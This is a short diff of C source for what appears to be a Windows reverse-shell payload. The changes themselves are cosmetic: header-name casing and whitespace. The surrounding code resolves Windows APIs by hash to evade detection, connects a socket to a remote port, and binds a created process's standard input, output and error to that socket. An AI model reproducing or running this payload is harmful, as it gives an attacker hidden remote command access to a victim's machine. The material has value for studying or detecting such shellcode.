@@ -4,8 +4,8 @@
 
 #include "GetProcAddressWithHash.h"
 #include "64BitHelper.h"
-#include <windows.h>
-#include <winsock2.h>
+#include <Windows.h>
+#include <WinSock2.h>
 #include <intrin.h>
 
 #define REMOTE_PORT 8080
@@ -100,7 +100,7 @@ VOID ExecutePayload( VOID )
 	MyWSAStartup =			(FuncWsaStartup) GetProcAddressWithHash( 0x006B8029 );
 	MyInetAddr =			(FuncInetAddr) GetProcAddressWithHash( 0x4D7B1E12 );
 	MyWSASocketA =			(FuncWsaSocketA) GetProcAddressWithHash( 0xE0DF0FEA );
-	MyCreateProcessA =		(FuncCreateProcess)GetProcAddressWithHash(0x863FCC79);
+	MyCreateProcessA =		(FuncCreateProcess) GetProcAddressWithHash( 0x863FCC79 );
 	MyWaitForSingleObject =	(FuncWaitForSingleObject) GetProcAddressWithHash( 0x601D8708 );
 	#pragma warning( pop )
 
@@ -113,9 +113,9 @@ VOID ExecutePayload( VOID )
 
 	MyConnect(s, (struct sockaddr*)&service, sizeof(service));
 
-	StartupInfo.hStdError = (HANDLE) s;
+	StartupInfo.hStdError =  (HANDLE) s;
 	StartupInfo.hStdOutput = (HANDLE) s;
-	StartupInfo.hStdInput = (HANDLE) s;
+	StartupInfo.hStdInput =	 (HANDLE) s;
 	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
 	StartupInfo.cb = 68;
 
